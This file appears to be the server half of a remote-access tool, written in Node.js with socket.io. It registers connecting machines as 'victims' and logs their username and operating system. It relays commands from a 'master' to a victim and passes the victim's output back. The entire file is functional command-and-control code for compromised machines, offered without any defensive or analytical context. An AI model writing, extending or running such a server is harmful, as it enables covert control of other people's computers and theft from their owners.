const app = require('express')();
const server = require('http').createServer(app);
const options = { /* ... */ };
const io = require('socket.io')(server, options);
const chalk = require("chalk");

//Variables
var victims = [];
var masters = [];


//Listening for connection...
io.on('connection', socket => { 
    console.log(chalk.green("Someone has joined, waiting to auth..."));

    //Authentification
    socket.on("auth", function(data){
        if (data.type === "master"){
            console.log("\t=> Master");
            masters.push(socket);
        }else{
            VictimJoinedManager(socket);
            console.log("\t=> "+socket.nickname+"\n\t\t-> user : "+data.username+"\n\t\t-> os : "+data.os+"\n");
            victims.push(socket);
        }
    });


    socket.on("disconnect", socket => {
        console.log(chalk.red(socket.nickname+" has disconnected."))
    });

    socket.on("response", function(data) {
        
        if (masters.length != 0){
            masters[0].emit("response", data);
        }
    });

    socket.on("launch", function(data){
        console.log("Launching "+data+"...")
        if (victims.length != 0){
            victims[0].emit("request", data);
        }
    });

});


//We name the client
function VictimJoinedManager(socket){
    socket.nickname = "Client"+Math.floor(Math.random() * 10000);
}


console.log(chalk.blue("\nListening on port 3000...\n"));
server.listen(3000);